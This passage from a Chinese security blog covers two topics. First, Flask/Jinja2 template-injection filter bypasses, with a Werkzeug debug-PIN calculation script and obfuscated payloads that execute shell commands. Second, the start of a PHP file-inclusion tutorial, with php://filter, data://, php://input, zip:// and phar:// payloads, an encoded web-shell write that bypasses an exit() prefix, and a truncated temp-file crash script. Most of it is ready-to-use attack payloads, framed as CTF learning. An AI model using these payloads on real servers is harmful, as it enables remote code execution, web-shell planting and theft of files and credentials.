<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><ol>
<li><p><strong>+拼接绕过</strong><br>最简单方法就是使用拼接<code>[&#39;glo&#39;+&#39;bals&#39;]</code>等价于<code>[&#39;globals&#39;]</code></p>
</li>
<li><p><strong>过滤器绕过</strong><br>前面介绍过的<code>reverse</code>反转过滤器<br>例如<code>&#123;%set a='__ssalc__'|reverse%&#125;&#123;&#123;a&#125;&#125;</code>,就是将<code>__ssalc__</code>逆序变成<code>__class__</code></p>
</li>
<li><p><strong>~拼接绕过</strong><br><strong>payload</strong><code>&#123;%set a="__cla"%&#125;&#123;%set b="ss__"%&#125;&#123;&#123;a~b&#125;&#125;</code></p>
</li>
<li><p><strong>其他</strong><br>类似于之前的编码绕过,格式化字符串,取字符绕过等方法也都是可以实现的,比较复杂,就不演示了</p>
</li>
</ol>
<h3 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h3><ol>
<li>Length过滤器绕过<br><strong>payload</strong><code>&#123;%set m='aaaaaaaaa'|length%&#125;&#123;&#123;m&#125;&#125;</code>这里的m为a的个数统计,为<code>9</code><br>可以配合加减乘除<br><code>&#123;%set m='aaaaaaaaaa'|length*'aa'|length%&#125;&#123;&#123;m&#125;&#125;</code>这边m等于9*2,为<code>18</code></li>
</ol>
<h3 id="config获取配置信息"><a href="#config获取配置信息" class="headerlink" title="config获取配置信息"></a>config获取配置信息</h3><p>flag有可能隐藏在<code>config</code>,无过滤的情况下可以直接<code>&#123;&#123;config&#125;&#125;</code>,或是<code>&#123;&#123;self.__dict__&#125;&#125;</code>查看配置信息<br>有时候有过滤,这时候可以利用内置函数或对象寻找被过滤的字符串<br>调用<code>current_app</code>相当于调用flask,绕一圈之后再使用config,效果和直接config是一样的<br><strong>payload</strong><br><code>&#123;&#123;url_for.__globals__['current_app']['con'+'fig']&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app']['con'+'fig']&#125;&#125;</code></p>
<h3 id="过滤特殊符号"><a href="#过滤特殊符号" class="headerlink" title="过滤特殊符号"></a>过滤特殊符号</h3><p>利用flask内置函数和对象获取符号,就是前面提到的取字符绕过<br>主要思路就是使用<code>string</code>和<code>list</code>过滤器,将结果转化为字符串列表储存,然后通过索引调用需要的字符串<br><strong>payload</strong><code>&#123;&#123;(config|string|list)[编号]&#125;&#125;</code>,config换成任何一个内置函数或者对象都行</p>
<h3 id="dict和jion"><a href="#dict和jion" class="headerlink" title="dict和jion"></a>dict和jion</h3><ol>
<li><p><code>dict()</code>用来创建一个字典<br><code>&#123;%set a=dict(class=1)%&#125;&#123;&#123;a&#125;&#125;</code>  a为字典,键为<code>class</code>,值为<code>1</code></p>
</li>
<li><p><code>join</code> 将一个序列化中的参数值拼接成字符串<br><code>&#123;%set a=dict(__cla=1,ss__=1)|join%&#125;&#123;&#123;a&#125;&#125;</code>join过滤器可以将字典的键拼接,此时的<code>a=__class__</code><br>或是这样拼接<br><code>&#123;%set a=('_','_',dict(cla=a,ss=a)|join,'_','_')|join%&#125;&#123;&#123;a&#125;&#125;</code><br>这里的用到了两个join,前面的是将<code>cla</code>和<code>ss</code>拼接到一起,后面的join是将下划线和<code>class</code>拼接到一起</p>
</li>
</ol>
<h3 id="debug的pin码计算"><a href="#debug的pin码计算" class="headerlink" title="debug的pin码计算"></a>debug的pin码计算</h3><p>debug功能是开发人员在计算机程序中查找和修复错误的过程。在flask框架下可以把debug选项设置为Ture,即可开启debug,一般情况下,在功能完善后,需要把debug功能关闭,如果不把debug功能关闭,可能会带来一些安全问题</p>
<p>在程序报错后,会在浏览器中提供一个交互调试器提示输入pin码,输入正确的pin码后可以实现命令的交互,并且,pin码并不是随机生成的,而是根据一些参数计算出来的<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230519204426.png"></p>
<p>贴一个大佬的脚本计算pin码,其实原理就是,将原本计算pin码的过程复制下来,然后各个值自己控制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># 参数一username,在ect/passwd可以看到</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 参数二modname,默认为flask.app</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 参数三getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)),默认为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 参数四getattr(mod, &#x27;__file__&#x27;, None),要获取app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377864455&#x27;</span>,  <span class="comment"># 参数五str(uuid.getnode()), 在/sys/class/net/ens33/address可以看到(需要转化十进制),一般为eth0</span></span><br><span class="line">    <span class="string">&#x27;ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8&#x27;</span>  <span class="comment"># 参数六get_machine_id(), 根据操作系统不同而不同,linux的是在/etc/machine-id可以看到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()  <span class="comment">#这里根据python的版本不同也不同,2.7版本用的是sha1(),将这里的md5()改成sha1</span></span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p><strong>注意!!!!!!!!</strong><br>使用这个脚本还需要注意一些其他问题,比如我们需要有文件包含漏洞,或是能ssti出一些内容,因为我们需要去各个路径下读取参数<br>由于第六个参数比较复杂,就先不详细介绍了,参数五根据操作系统也有变化,参数四有默认值<br><code>print(int(&#39;mc地址&#39;,16))</code>参数五的转化代码,把mac地址的<code>:</code>删了<br><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">参考1</a>,<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11036">参考2</a>,<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44214568/article/details/124125565">参考3</a></p>
<h1 id="超级无敌payload"><a href="#超级无敌payload" class="headerlink" title="超级无敌payload"></a>超级无敌payload</h1><p>为了绕过,故意写的很抽象,偶尔偶尔用的上吧,有时候用不上也不知道什么原因,可能是payload中的某些被过滤了</p>
<p>过滤了<code>下划线_</code>,<code>空格</code>,<code>单引号&#39;&#39;和双引号&quot;&quot;</code>,<code>数字</code>,<code>某些关键字</code>,<code>中括号[]</code>,<code>小数点.</code>,<code>\</code><br>可以考虑试一下下面这个payload,基本很难cat,因为小数点被过滤了比如<code>flag.txt</code>就cat不了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eighteen=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ge=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(glo)|attr(ge)(o)|attr(pope)(sys)|attr(rea)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>基本思路就是,在<code>lipsum</code>模块中找字符代替下划线和空格,用<code>dict(aaaaaaaaa=a)|join|count</code>来获取数字,用<code>dict+join</code>法绕过关键字<br><code>sys</code>是最后要执行的命令,可以改成<br><code>&#123;%set (sys=dict(cat=a)|join,kg,dict(fl=a,ag=a)|join)join%&#125;</code>这段代码等于cat flag<br>如果过滤的少点还可以<br><code>&#123;%set (sys=dict(cat=a)|join,kg,'/',dict(f=a)|join,'*')join%&#125;</code>这段代码等于<code>cat /f*</code>获取根目录下所有f开头的文件(用了通配符)</p>
<p>下面这个payload过滤的没上面那么多,但是有时候比上面的更好用(不知道为啥,可能上面的代码多了更容易被过滤,比如<code>attr</code>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)[<span class="number">18</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)[<span class="number">9</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a)|join,<span class="built_in">dict</span>(bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum[glo][o][pope](sys)[rea]()&#125;&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">文件包含漏洞的学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-05-04 20:58:52" itemprop="dateCreated datePublished" datetime="2023-05-04T20:58:52+08:00">2023-05-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-09 21:15:02" itemprop="dateModified" datetime="2023-05-09T21:15:02+08:00">2023-05-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>28 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>所谓文件包含漏洞就是指,后端代码使用了一些文件包含的函数,如果用户能控制这些函数的参数,就可以实现<strong>任意代码读取</strong>,<strong>getshell</strong>,<strong>命令执行</strong>等多种攻击手段<br>文件包含漏洞可以简单的分为<strong>本地文件包含</strong>和<strong>远程文件包含</strong>,本质上没有区别,开发人员应该尽可能的避免用户控制文件包含函数的参数,或是进行严格的过滤</p>
<h2 id="php各种伪协议的利用"><a href="#php各种伪协议的利用" class="headerlink" title="php各种伪协议的利用"></a>php各种伪协议的利用</h2><ol>
<li><p><strong>什么是php的伪协议</strong><br>PHP伪协议是指PHP支持的一些特殊的协议，它们可以用来访问各种<code>输入/输出流</code>、内存中的临时文件流以及其他读取写入文件资源的过滤器。PHP支持多种伪协议，包括 <code>file://、http://、ftp://、php://、zlib://、data://、glob://、phar://、ssh2://、rar:// 和 ogg:// </code>等。</p>
</li>
<li><p><strong>伪协议的安全问题</strong><br>伪协议通常配合文件包含漏洞一起利用。文件包含的函数有<code>include()</code>, <code>include_once()</code>,<code>require()</code>,<code>require_once()</code>等等.文件包含本身存在的问题是,无论包含的是什么后缀的文件,都会被当成php文件解析,这在<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/04/04/Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#%E5%9B%BE%E7%89%87%E9%A9%AC">文件上传</a>中已经有利用过,如果我们能控制文件包含函数的参数,配合伪协议,能实现更多攻击手段</p>
</li>
<li><p><strong>可以利用的伪协议</strong><br>下面介绍六种可能会导致安全问题的伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter</span><br><span class="line">php://input</span><br><span class="line">file:// </span><br><span class="line">data:// </span><br><span class="line">zip:// </span><br><span class="line">phar:// </span><br></pre></td></tr></table></figure>
<p>可能导致文件包含的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include和require函数</span><br><span class="line">include和include_once</span><br><span class="line">highlight_file()和show_source()</span><br><span class="line">readfile和file_get_contents和file</span><br><span class="line">file_put_contents</span><br><span class="line">fopen</span><br></pre></td></tr></table></figure>
<p>使用PHP伪协议可能会导致安全风险，因此应谨慎使用。为了防止潜在的安全威胁，可以将<code>allow_url_include</code>配置选项设置为<code>off</code>，这样就限制无法包含远程文件了,需要注意的是，从<code>PHP5.2</code>开始,allow_url_include默认为Off。</p>
<p><code>allow_url_fopen</code>是一个PHP配置选项，它控制PHP是否可以使用文件函数（如fopen，file_get_contents和include 来访问URL对象（如HTTP和FTP资源）。allow_url_fopen默认都是on。</p>
</li>
</ol>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>php:&#x2F;&#x2F;filter是一种元封装器，是PHP中特有的协议流，设计用于数据流打开时的筛选过滤应用，作用是作为一个“中间流”来处理其他流。简单来说,就是作为一个中间的代理,将读入或者写入的数据按照规定参数进行过滤或处理后输出<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230505160603.png"><br>第四点告诉了我们其实<code>read</code>和<code>write</code>是可以省略的<br>我们可以通过不同参数对读入写入的数据进行不同的处理,这里介绍几个可能导致危险的参数</p>
<ol>
<li><p><strong>convert.base64-encode</strong><br>作用是对数据流进行<code>base64</code>编码,如果不对数据进行编码的话,那所包含的文件就会被当成代码执行,不会输出结果,但编码后,就可以对任意文件进行读取,可以通过这个方式读取源码,然后进一步白盒审计<br>payload:  <code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
</li>
<li><p><strong>convert.base64-decode</strong><br>作用是对数据流<code>base64</code>解码,利用这个过滤器,可以实现对<strong>死亡exit</strong>的绕过<br>死亡exit指的是在进行写入PHP文件操作时，执行了类似以下函数<br><code>file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);</code><br>这样一来无论我们想要写入什么内容,都会在开头被拼接插上<code>exit()</code>,导致强行终止<br>为什么使用base64解码可以绕过呢,base64只能识别64个可打印字符(大写字母,小写字母,数字,加号(+)和斜杠(&#x2F;)),遇到其他不属于base64字符集的字符时,会跳过这些字符,而不是停止解码<br>例如被插入了<code>&lt;?php exit()?&gt;</code>,解码只能识别其中的<code>phpexit</code>,其他会被跳过<br>因为base64解码是四个字符为一组进行解码,所以我们只需要将前面无用的内容凑出四的倍数,比如<code>phpexito</code>再将已经编码好的一句话木马写在后面,这样进行解码的时候就会将前面的死亡exit绕过,同时解码一句话木马<br>pyload:<br><code>txt=QPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code></p>
</li>
<li><p><strong>string.strip_tags</strong><br>用来处理掉读入的所有标签，例如XML,HTML注释和PHP标签也会被去除。(PHP4, PHP5, PHP7)（自PHP7.3.0起已弃用此功能。）<br>由于<code>&lt;?php exit; ?&gt;</code>,实际上这是一个XML标签,所以我们可以通过string.strip_tags过滤器将这个死亡exit去除,但是我们要写入的一句话木马也会被去除,所以我们可以先将一句话木马进行编码,利用过滤器可以叠加的特性,先去除死亡exit,再将一句话木马还原<br>payload:<br><code>php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</code></p>
</li>
</ol>
<h3 id="php-x2F-x2F-input-伪协议"><a href="#php-x2F-x2F-input-伪协议" class="headerlink" title="php:&#x2F;&#x2F;input 伪协议"></a>php:&#x2F;&#x2F;input 伪协议</h3><p>条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: on/off</span><br><span class="line">allow_url_include: on</span><br></pre></td></tr></table></figure>
<p>php:&#x2F;&#x2F;input是一个可以访问请求的原始数据的只读流。它可以读取POST请求的参数<br>简单来说,它与使用$_POST变量来获取POST参数类似，但是php:&#x2F;&#x2F;input提供了更多的灵活性。<br>例如使用eval()函数来执行从php:&#x2F;&#x2F;input获取的数据,就可以导致任意代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在上面的代码中，攻击者可以使用如下 URL 来执行恶意代码：<br><code>http://www.example.com/index.php?file=php://input</code><br>当用户访问上面的 URL 时，服务器会读取请求正文中的数据，并将其作为PHP代码执行。因此，攻击者可以在请求正文中发送恶意代码，从而在服务器上执行任意命令。</p>
<h3 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F; 伪协议"></a>file:&#x2F;&#x2F; 伪协议</h3><p>用于访问本地文件系统,允许攻击者读取本地文件系统中的文件。这个伪协议通常用于读取敏感文件，例如配置文件或数据库凭据。需要注意的是,<code>file://</code> 后面必须跟着是本地的绝对路径,不允许是相对路径,或是远程文件</p>
<h3 id="data-x2F-x2F-伪协议"><a href="#data-x2F-x2F-伪协议" class="headerlink" title="data:&#x2F;&#x2F; 伪协议"></a>data:&#x2F;&#x2F; 伪协议</h3><p>条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: on</span><br><span class="line">allow_url_include: on</span><br></pre></td></tr></table></figure>
<p>data:&#x2F;&#x2F;伪协议是数据流封装器，传递相应格式的数据<br><code>data://</code> 伪协议的语法如下：<br><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code><br>如果使用include()或require()函数来包含从用户输入中获取的<code>data://</code>， 通常可以用来执行PHP代码。<br>payload:<br><code>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code><br><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
<h3 id="zip-x2F-x2F-伪协议"><a href="#zip-x2F-x2F-伪协议" class="headerlink" title="zip:&#x2F;&#x2F; 伪协议"></a>zip:&#x2F;&#x2F; 伪协议</h3><p><code>zip://</code>伪协议属于压缩流，可以访问压缩文件中的子文件(相同的类型的还有<code>zlib://</code>和<code>bzip2://</code>)<br>语法  <code>zip:// [压缩文件绝对路径] # [压缩文件内的子文件名]</code><br>例如  有一个<code>myzip.zip</code>的压缩文件，其中包含一个名为<code>myfile.txt</code>的文件，可以使用以下语法访问该文件：<code>zip://myzip.zip#myfile.txt</code>(要是在URL中<code>#</code>要写成<code>%23</code>)<br>此外这个伪协议也可以配合文件上传漏洞使用,如果攻击者能够上传一个包含恶意PHP代码的zip文件，并且能够控制包含函数的参数，那么他们就可以使用zip:&#x2F;&#x2F;伪协议来执行恶意代码。<br><strong>payload</strong><br><code>?file=zip://evil.zip#shell.php</code><br>注意 这个伪协议对后缀不敏感,所以可以将先将文件压缩为zip,再将后缀改成jpg,然后<br><code>?file=zip://evil.jpg#shell.php</code></p>
<h3 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F; 伪协议"></a>phar:&#x2F;&#x2F; 伪协议</h3><p><code>phar://</code>伪协议和<code>zip://</code>伪协议类似,phar本身就是php中压缩文件的一种形式,所以可以通过phar:&#x2F;&#x2F;访问zip压缩文件中的子文件(注:php版本大于等于5.3.0，压缩包只能是zip协议压缩)<br>语法  <code>phar:// [压缩文件绝对路径] / [压缩文件内的子文件名]</code><br><strong>payload</strong><br><code>?file=phar://evil.zip/shell.php</code></p>
<p>更重要的是,phar:&#x2F;&#x2F;伪协议可以配合<strong>反序列化漏洞</strong>,用伪协议配合一些危险函数可以触发phar文件中的元数据的反序列化<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">phar反序列化漏洞</a></p>
<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br><span class="line">版本要求：</span><br><span class="line">php7.0.0-7.1.2</span><br><span class="line">php7.1.3-7.2.1</span><br><span class="line">php7.2.2-7.2.8</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">版本要求：</span><br><span class="line">php&lt;=5.6.38</span><br><span class="line">php7.0.0-7.0.32</span><br><span class="line">php7.0.4-7.2.12</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>什么是临时文件</strong><br>临时文件是计算机系统在执行某些操作时创建的文件，用于存储临时数据。这些文件通常在操作完成后被删除，但有时它们可能会遗留在系统中。<br>一般认为，上传文件需要对应的功能点，但实际上，无论是否有文件上传的功能点，只要HTTP请求中存在文件，那么就会被保存为临时文件，当前HTTP请求处理完成后，垃圾回收机制会自动删除临时文件。</li>
<li><strong>怎么利用</strong><br>临时文件的存储位置取决于操作系统和应用程序。在Windows操作系统中，临时文件通常存储在<code>C:\Windows\Temp</code>和<code>C:\Users\[用户名]\AppData\Local\Temp</code>目录下。在Linux和macOS操作系统中，临时文件通常存储在<code>/tmp</code>目录下,如果我们能知道文件最后保存的名字,就可以配合文件包含功能,上传我们想要的代码.<br>php7 segment fault特性：如果我们向后端发送大量文件,就会导致php崩溃,这时最后发送的文件就会被保留在临时文件中,我们利用文件包含漏洞包含这个临时文件,就可以实现这个文件的代码<br><strong>payload:</strong><br><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code><br>python脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">url=<span 